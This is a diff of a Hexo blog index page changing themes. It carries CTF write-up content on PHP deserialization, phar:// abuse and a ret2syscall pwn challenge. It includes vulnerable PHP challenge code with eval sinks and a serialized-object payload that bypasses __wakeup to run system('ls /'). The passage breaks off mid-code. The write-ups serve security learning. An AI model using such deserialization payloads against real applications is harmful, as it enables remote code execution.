@@ -1,731 +1,550 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 8.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/css/main.css">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
 
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta property="og:type" content="website">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://example.com/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'en'
-  };
-</script>
-
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
   <title>Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
 
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+<body>
+  
 
-</head>
+  <header>
+    
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Hexo</h1>
-      <span class="logo-line-after"><i></i></span>
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
     </a>
-  </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
 </nav>
 
+  
 
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="An elegant Material-Design theme for Hexo"></span>
+          
+        </div>
 
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
 
 </div>
-    </header>
 
+  </header>
+
+  <main>
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
+      <div class="container nopadding-x-md">
+        <div id="board"
+          style="margin-top: 0">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/11/29/web/" target="_self">
+          web
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/11/29/web/" target="_self">
+        <div>
+          php反序列化魔术方法 _construct :一个对象被建立时被调用 _destruct: 一个对象被销毁时调用 _toString： 当一个对象作为一个字符串使用时调用 _sleep: 在对象被反序列化前调用 _wakeup:在反序列化之后调用 _get:当对象调用不可访问属性时触发 _call: 在对象调用不可访问函数时触发 _invoke:当对象被当作函数调用时会自动触发 phar pha
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-11-29 21:43" pubdate>
+              2025-11-29
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web/">#web</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
 
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/11/29/web-11/1/" target="_self">
           
+        </a>
+      </h2>
 
-          <div class="content index posts-expand">
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/11/29/web-11/1/" target="_self">
+        <div>
+          
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-11-29 21:42" pubdate>
+              2025-11-29
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/11/29/web-11/" target="_self">
+          web_11
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/11/29/web-11/" target="_self">
+        <div>
+          Web NOV[UUCTF 2022 新生赛]ez_unser1234567891011121314151617181920212223242526 &lt;?phpshow_source(__FILE__);###very___so___easy!!!!class test&#123;    public $a;    public $b;    public $c;    public fun
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-11-29 21:41" pubdate>
+              2025-11-29
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
             
+              <a href="/tags/web-wp/">#web,wp</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/11/26/pwn-11/1/" target="_self">
+          
+        </a>
+      </h2>
+
       
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/29/web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/11/26/pwn-11/1/" target="_self">
+        <div>
           
-            <a href="/2025/11/29/web/" class="post-title-link" itemprop="url">web</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-11-29 21:43:55" itemprop="dateCreated datePublished" datetime="2025-11-29T21:43:55+08:00">2025-11-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-30 20:17:11" itemprop="dateModified" datetime="2025-11-30T20:17:11+08:00">2025-11-30</time>
-              </span>
-
-          
-
         </div>
-      </header>
+      </a>
 
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-11-26 20:12" pubdate>
+              2025-11-26
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
     
     
-    
-    <div class="post-body" itemprop="articleBody">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/11/26/pwn-11/" target="_self">
+          pwn-11月
+        </a>
+      </h2>
 
       
-          <h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p> _construct :一个对象被建立时被调用<br> _destruct: 一个对象被销毁时调用<br> _toString： 当一个对象作为一个字符串使用时调用<br> _sleep: 在对象被反序列化前调用<br> _wakeup:在反序列化之后调用<br> _get:当对象调用不可访问属性时触发<br> _call: 在对象调用不可访问函数时触发<br> _invoke:当对象被当作函数调用时会自动触发</p>
-<h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p> phar是一种将多个php文件打包在一起的压缩包文件，由四个部分组成<br> 1.stub：即Phar文件的文件头，默认是<?php xxxx  __HALT_COMPILER(); ?>，xxx可以是自定义的任何字符，不定义默认就为<?php __HALT_COMPILER(); ?><br> 2.a manifest describing the contents：phar包的各种属性信息，包括文件名、压缩文件的大小，序列化的文件、大小等等<br> 3.file contents：即要添加的压缩的文件的名<br> 4.Phar Signature format：即Phar文件的签名，确保文件的完整性，可以是20字节的SHA1，16字节的MD5，32字节的SHA256，64字节的512等</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用phar就要提到phar伪协议了，是一个php解压缩函数，不管后缀，都会被当作压缩包解压，由于Phar内容清单中存储内容的形式是序列化的，当文件中有file_get_content()，file_exists()等函数的参数可控时候，使用phar://伪协议，会直接进行反序列化的操作将文件内容还原，即使不用unserialize()反序列化函数也能进行反序列化的操作，就有可能导致反序列化的漏洞</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/29/web-11/1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/11/29/web-11/1/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-11-29 21:42:02" itemprop="dateCreated datePublished" datetime="2025-11-29T21:42:02+08:00">2025-11-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-30 21:16:46" itemprop="dateModified" datetime="2025-11-30T21:16:46+08:00">2025-11-30</time>
-              </span>
-
-          
-
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/11/26/pwn-11/" target="_self">
+        <div>
+          [CISCN 2023 初赛]烧烤摊儿     发现在gaming函数中存在将v5变量输入给全局name，并且没有对v5进行长度限制，有栈溢出在.data里发现了name，可以考虑将&#x2F;bin&#x2F;sh写入.data段，因为是静态文件，其中没有libc和system，用ret2syscall构造execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)get shel
         </div>
-      </header>
+      </a>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-11-26 20:00" pubdate>
+              2025-11-26
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
 
-      
-          <p><img src="/image.png" alt="alt text"><br><img src="/image-1.png" alt="alt text"><br><img src="/image-2.png" alt="alt text"><br><img src="/image-3.png" alt="alt text"><br><img src="/image-4.png" alt="alt text"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
+<span class="category-chains">
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/29/web-11/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/11/29/web-11/" class="post-title-link" itemprop="url">web_11</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-11-29 21:41:49" itemprop="dateCreated datePublished" datetime="2025-11-29T21:41:49+08:00">2025-11-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-30 21:38:04" itemprop="dateModified" datetime="2025-11-30T21:38:04+08:00">2025-11-30</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Web-NOV"><a href="#Web-NOV" class="headerlink" title="Web NOV"></a>Web NOV</h1><h2 id="UUCTF-2022-新生赛-ez-unser"><a href="#UUCTF-2022-新生赛-ez-unser" class="headerlink" title="[UUCTF 2022 新生赛]ez_unser"></a>[UUCTF 2022 新生赛]ez_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-<p>很明显要绕过wakeup，但是修改属性不行，因为做了检验，可以使用b&#x3D;c&#x3D;test:3,但是没用，那可以使用引用绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;b=&amp;<span class="variable">$d</span>-&gt;a;</span><br><span class="line"><span class="variable">$d</span>-&gt;c=<span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure>
-<p>使a引用b，c为命令</p>
-<img src="/2025/11/29/web-11/image.png" class=""> 
-
-<h2 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h2><img src="/2025/11/29/web-11/image-1.png" class=""> 
-<p>查询index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到POST上传数据给到 file_get_contents，代码中又有eval，可以利用，要绕过_wakeup<br>再查看upload.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span 